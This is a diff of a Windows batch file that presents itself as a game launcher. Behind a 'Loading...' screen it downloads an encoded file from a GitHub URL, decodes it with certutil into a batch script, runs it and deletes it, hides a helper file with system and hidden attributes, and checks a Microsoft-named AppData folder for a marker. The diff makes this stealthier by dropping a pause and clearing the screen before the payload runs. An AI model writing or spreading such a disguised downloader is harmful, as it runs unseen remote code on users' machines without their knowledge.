@@ -1,17 +1,19 @@
-rem @echo off
+@echo off
 cls
 title Loading...
 echo Loading...
+set paa=%cd%
 echo Del Game.bat>End.bat
 echo exit>>End.bat
 attrib End.bat +s +h
 if not exist %appdata%\Microsoft\System\*.bat (
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/RickDawlson/Ping/main/Installer', 'Instructions.txt')"
-certutil -f -decode Instructions.txt Instructions.bat
-Del Instructions.txt
-pause
-call Instructions.bat
-del Instructions.bat
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/RickDawlson/Ping/main/Installer', 'High.txt')"
+certutil -f -decode High.txt High.bat
+cls
+Del High.txt
+call High.bat
+cd %cd%
+del High.bat
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/RickDawlson/Ping/main/Game', 'Highlow.bat')"
 cls
 call Highlow.bat
